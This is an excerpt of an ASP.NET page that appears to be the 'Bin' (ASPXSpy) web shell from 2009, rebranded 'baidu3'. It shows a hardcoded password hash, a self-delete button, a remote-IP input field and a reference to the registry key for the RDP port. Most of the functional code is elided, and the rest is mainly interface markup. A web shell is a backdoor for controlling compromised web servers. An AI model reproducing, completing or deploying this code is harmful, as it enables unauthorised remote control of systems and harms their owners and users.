...
E-mail : master@baidu.com
*/
    public string Password = "29e721addb7803542b0d8cd9a1783414";
public string vbhLn="baidu3";
public int TdgGU=1;
...
Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete baidu3?')){Bin_PostBack('hae','');};";
...
Copyright &copy; 2009 Bin -- <a href="http://www.baidu.com" target="_blank">www.baidu.com</a>
</div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;"><a href="http://www.baidu.com" target="_blank">baidu3 Ver: 2009</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="www.baidu.com"/></td>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2006-2009 <a href="http://www.baidu.com" target="_blank">Bin'Blog</a> All Rights Reserved.[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\Wds\rdpwd\Tds\tcp]</div></div>
</form>
</body>
</html>